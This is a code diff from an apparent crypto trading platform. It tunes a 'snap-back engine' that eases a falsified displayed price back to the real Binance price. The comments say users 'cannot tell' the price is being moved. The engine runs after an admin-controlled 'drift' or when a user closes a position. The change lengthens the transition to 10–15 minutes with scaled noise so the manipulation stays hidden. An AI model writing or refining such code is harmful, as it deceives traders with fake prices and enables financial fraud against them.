@@ -348,13 +348,13 @@ function startDriftEngine(state) {
 
 // ─── Snap-back engine ─────────────────────────────────────────────────────────
 // Gradually returns price to real Binance price with natural-looking rises/falls.
-// Takes ~2 minutes (120 steps at 1s tick) to reach real Binance price.
+// Takes ~10–15 minutes (600–900 steps at 1s tick) to reach real Binance price.
 // Looks completely natural — user cannot tell it's transitioning.
 // Used when: (a) admin stops drift, (b) user closes position.
-const SNAPBACK_MIN_STEPS = 8;
-const SNAPBACK_MAX_STEPS = 15;
-const SNAPBACK_NOISE = 0.004; // realistic noise scale
-const SNAPBACK_MOMENTUM_SCALE = 0.0006; // momentum for natural rises/falls
+const SNAPBACK_MIN_STEPS = 600; // 10 minutes (1 step = 1 second)
+const SNAPBACK_MAX_STEPS = 900; // 15 minutes
+const SNAPBACK_NOISE = 0.0004; // realistic noise scale (reduced for longer duration)
+const SNAPBACK_MOMENTUM_SCALE = 0.00006; // momentum for natural rises/falls (reduced for longer duration)
 
 function randomSnapBackSteps() {
   return Math.floor(Math.random() * (SNAPBACK_MAX_STEPS - SNAPBACK_MIN_STEPS + 1)) + SNAPBACK_MIN_STEPS;
@@ -372,9 +372,10 @@ function computeSnapBackPrice(state) {
   const stepIndex = Math.min(snapBack.step + 1, totalSteps);
   const progress = stepIndex / totalSteps;
 
-  // Gradual bridge toward Binance with organic noise (8–15 transition steps)
+  // Gradual bridge toward Binance with scaled noise (10–15 minute transition)
   const linearTarget = snapBack.startPrice + gap * progress;
-  const noise = (Math.random() - 0.5) * Math.max(Math.abs(gap) * 0.04, realPrice * 0.00012);
+  const perStep = Math.abs(gap) / totalSteps;
+  const noise = (Math.random() - 0.5) * Math.max(perStep * 0.5, realPrice * 0.00004);
   snapBack.velocity = (Number(snapBack.velocity) || 0) * 0.82 + gaussianNoise(SNAPBACK_MOMENTUM_SCALE);
   let nextPrice = linearTarget + noise + (snapBack.velocity * realPrice);
 
